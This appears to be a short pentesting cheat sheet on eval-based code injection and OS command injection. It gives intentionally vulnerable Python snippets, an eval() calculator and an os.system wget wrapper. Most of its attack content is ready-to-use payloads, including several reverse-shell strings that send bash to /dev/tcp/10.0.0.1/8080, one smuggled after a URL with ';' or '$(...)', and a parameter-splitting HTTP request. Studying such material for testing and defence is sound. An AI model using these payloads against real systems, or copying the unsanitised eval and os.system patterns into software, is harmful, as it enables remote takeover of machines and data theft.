### what && when
happen when applications allow user input to be confused with executable code, Sometimes this happens unintentionally, when applications pass unsanitized data into executed code like $shellshoke$ cve; other times, this is built into the application as an intentional feature like execute `eval()` 
###### eval example && payload 
```python
#online calculate
def calculate(input): 
	return eval("{}".format(input)) 
result = calculate(user_input.calc) 
print("The result is {}.".format(result))
```
*reverse shell* payload: `"__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"` ,
`GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"`
###### how to test
- By using comments and injecting `/*` random value `/`.
- By injecting a simple concatenation `"."` (where `"` are used to break the syntax and reform it correctly).
- By replacing the parameter you provided by a string concatenation, for example `"."ha"."cker"."` instead of `hacker`.

## command injection
### what && when
occurs when user input is concatenated directly into a system command, Aside from happening in web applications, command injections are also incredibly prevalent in embedded web applications because of their dependency on shell commands and frameworks using wrappers that execute shell commands
###### `system` example and payload
```python
import os 
def download(url): 
	os.system("wget -O- {}".format(url)) 
display(download(user_input.url))
```
*reverse shell* payload: `"google.com; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"` 
`"google.com$(bash -i >& /dev/tcp/10.0.0.1/8080 0>&1)"` 